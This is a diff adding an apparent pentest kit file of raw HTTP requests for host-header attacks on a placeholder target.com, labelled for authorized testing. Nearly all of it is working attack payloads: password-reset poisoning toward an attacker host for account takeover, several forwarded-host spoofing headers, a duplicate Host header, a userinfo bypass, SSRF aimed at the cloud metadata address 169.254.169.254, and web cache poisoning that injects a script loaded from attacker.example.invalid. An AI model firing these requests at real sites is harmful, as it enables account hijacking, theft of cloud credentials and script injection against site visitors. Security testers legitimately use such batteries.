@@ -1,0 +1,58 @@
+###
+# ============================================================================
+# Safe PoC -> x8bitranjit
+# Host-header attack battery (.http format) - reset poisoning / cache / SSRF.
+# Authorized testing only. WHAT TO EDIT: target.com + real sinks (HOST-001 map).
+# KIT CROSS-REF: HostHeader_CHECKLIST rows 003-010.
+# ============================================================================
+
+### 1) baseline: is the host reflected/used?
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: hh-probe.example.invalid
+
+### 2) password-reset poisoning -> ATO (send to your own inbox first)
+POST /forgot-password HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.example.invalid
+Content-Type: application/json
+
+{"email":"YOUR-TEST@example.invalid"}
+
+### 3) spoofing header battery (try each in turn)
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.example.invalid
+
+###
+GET / HTTP/1.1
+Host: target.com
+X-Host: evil.example.invalid
+
+###
+GET / HTTP/1.1
+Host: target.com
+X-HTTP-Host-Override: evil.example.invalid
+
+### 4) duplicate Host (proxy/front-end disagreement)
+GET / HTTP/1.1
+Host: target.com
+Host: evil.example.invalid
+
+### 5) port/userinfo validation bypass
+GET / HTTP/1.1
+Host: target.com:80@evil.example.invalid
+
+### 6) routing-based SSRF (front-end routes by Host)
+GET / HTTP/1.1
+Host: 169.254.169.254
+
+### 7) web cache poisoning via unkeyed XFH (verify a SECOND clean request
+###    still receives the poisoned response - that is the proof)
+GET /?cb=hhpoison1 HTTP/1.1
+Host: target.com
+X-Forwarded-Host: a"><script src=//attacker.example.invalid/x.js></script>
+
+### 8) absolute-URI request line (overrides Host at some front-ends)
+GET https://evil.example.invalid/ HTTP/1.1
+Host: target.com
